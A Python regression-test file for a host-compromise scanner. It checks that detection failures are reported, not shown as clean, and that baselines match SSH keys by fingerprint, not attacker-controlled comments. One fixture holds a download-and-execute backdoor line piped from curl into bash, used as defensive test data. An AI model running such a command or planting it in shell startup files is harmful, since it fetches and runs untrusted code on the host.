"""Regression tests for the 2.3.0 bridge release (docs/plans/v3.0.0-plan.md §3).

N-01: a detection-stage failure must never read as a clean host.
N-14: baselines must not be keyed on text an attacker chooses.
"""
import base64
import hashlib
import warnings
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from ubuntils import cli
from ubuntils.collectors.source import LiveSource
from ubuntils.detectors.finding import Finding, Severity
from ubuntils.pipeline import run_scan
from ubuntils.utils.baseline import Baseline, load_baseline
from ubuntils.utils.config import Allowlist


class _ExplodingBaseline(Baseline):
    def filter(self, findings):
        raise RuntimeError("baseline exploded")


class _ExplodingAllowlist(Allowlist):
    def filter(self, findings):
        raise RuntimeError("allowlist exploded")


def _scan(**kwargs):
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.TimelineBuilder") as tl:
        tl.return_value.build.return_value = []
        return run_scan(LiveSource(), forward_wazuh=False, **kwargs)


# ── N-01 ─────────────────────────────────────────────────────────────────────

def test_N01_baseline_filter_crash_is_reported_not_clean():
    r = _scan(baseline=_ExplodingBaseline())
    assert r.findings == []
    assert "DetectionEngine" in r.scan_metadata["rules_failed"]
    assert "baseline exploded" in r.scan_metadata["detection_error"]
    assert r.stats["detection_error"] == r.scan_metadata["detection_error"]


def test_N01_allowlist_filter_crash_is_reported_not_clean():
    r = _scan(allowlist=_ExplodingAllowlist())
    assert "DetectionEngine" in r.scan_metadata["rules_failed"]
    assert "allowlist exploded" in r.scan_metadata["detection_error"]


def test_N01_healthy_scan_has_no_detection_error():
    r = _scan()
    assert r.scan_metadata["detection_error"] is None
    assert "DetectionEngine" not in r.scan_metadata["rules_failed"]


def test_N01_tui_summary_does_not_say_clean():
    from ubuntils.tui.summary_screen import _build_summary
    r = _scan(baseline=_ExplodingBaseline())
    text = _build_summary(r.findings, r.timeline, r.stats)
    assert "appears clean" not in text
    assert "Detection failed" in text


def test_N01_cli_json_exits_nonzero(monkeypatch, tmp_path):
    monkeypatch.setattr(cli, "_ensure_root", lambda: None)
    monkeypatch.setattr(cli, "load_baseline", lambda path: _ExplodingBaseline())
    baseline = tmp_path / "b.yaml"
    baseline.write_text("baseline: []\n")
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.TimelineBuilder") as tl:
        tl.return_value.build.return_value = []
        result = CliRunner().invoke(
            cli.main, ["scan", "--json", "--no-wazuh", "--baseline", str(baseline)])
    assert result.exit_code == cli.EXIT_DETECTION_FAILED
    assert '"detection_error"' in result.output


# ── N-14 ─────────────────────────────────────────────────────────────────────

_ADMIN_KEY = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519admin-key-blob").decode()
_ATTACKER_KEY = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519attacker-blob").decode()


def _key_finding(key_data, comment="ci@ci-runner", options="", signals=None):
    line = " ".join(filter(None, [options, "ssh-ed25519", key_data, comment]))
    return Finding(
        rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t", description="d",
        artifact_path="/home/ci/.ssh/authorized_keys", raw_value=line,
        remediation_available=True, signals=signals or [],
    )


def _sha256_fp(key_data):
    blob = base64.b64decode(key_data)
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


def test_N14_attacker_key_with_baselined_comment_is_not_suppressed():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "ci@ci-runner"}])
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_baselined_text_in_key_options_is_not_matched():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "known-good"}])
    f = _key_finding(_ATTACKER_KEY, comment="x", options='environment="X=known-good"')
    assert not b.matches(f)


def test_N14_key_matches_by_sha256_fingerprint():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY",
                           "fingerprint": _sha256_fp(_ADMIN_KEY)}])
    assert b.matches(_key_finding(_ADMIN_KEY))
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_key_matches_by_key_data():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": _ADMIN_KEY}])
    assert b.matches(_key_finding(_ADMIN_KEY, comment="anything"))
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_path_entry_does_not_hide_new_download_and_execute_line():
    b = Baseline(entries=[{"rule_id": "SHELL_RC_MODIFICATION",
                           "fingerprint": "/home/deploy/.bashrc"}])
    churn = Finding(rule_id="SHELL_RC_MODIFICATION", severity=Severity.LOW, title="t",
                    description="d", artifact_path="/home/deploy/.bashrc",
                    raw_value="/home/deploy/.bashrc", remediation_available=False)
    backdoor = Finding(rule_id="SHELL_RC_MODIFICATION", severity=Severity.MEDIUM, title="t",
                       description="d", artifact_path="/home/deploy/.bashrc",
                       raw_value="curl http://x.invalid/s | bash", remediation_available=False,
                       signals=[{"name": "content_match", "weight": 30, "detail": "d"}])
    assert b.matches(churn)
    assert not b.matches(backdoor)


def test_N14_v1_baseline_warns_about_3_0(tmp_path):
    p = tmp_path / "b.yaml"
    p.write_text("baseline:\n  - rule_id: USER_UID_ZERO\n    fingerprint: ghost\n")
    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")
        load_baseline(str(p))
    assert any(issubclass(w.category, FutureWarning) and "3.0" in str(w.message)
               for w in caught)


def test_N14_unknown_baseline_version_is_refused(tmp_path):
    p = tmp_path / "b.yaml"
    p.write_text("version: 2\nbaseline: []\n")
    with pytest.raises(ValueError, match="version 2"):
        load_baseline(str(p))
